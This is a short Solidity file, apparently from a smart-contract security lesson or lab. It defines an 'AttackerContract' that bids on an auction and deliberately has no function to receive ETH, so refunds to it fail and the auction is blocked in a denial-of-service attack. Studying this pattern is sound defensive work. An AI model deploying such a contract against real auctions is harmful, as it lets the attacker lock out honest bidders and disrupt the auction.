// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IAuction {
  function bid() external payable;
}

contract AttackerContract is Ownable {
  IAuction public immutable auctionContract;

  constructor(address _auctionContract) {
    // Initializing the instance to the Auction contract through the IAuction interface
    auctionContract = IAuction(_auctionContract);
  }

  function bid() external payable onlyOwner {
    require(msg.value > 0 , "Error, the bid must be greater than 0");
    // Send a bid to the auction contract
    // Forward the received amount of ETH onto the bid() function from the Auction contract
    auctionContract.bid{ value : msg.value }();
  }

  // no fallback() nor receive() function - This contract must not receive any incoming ETH

}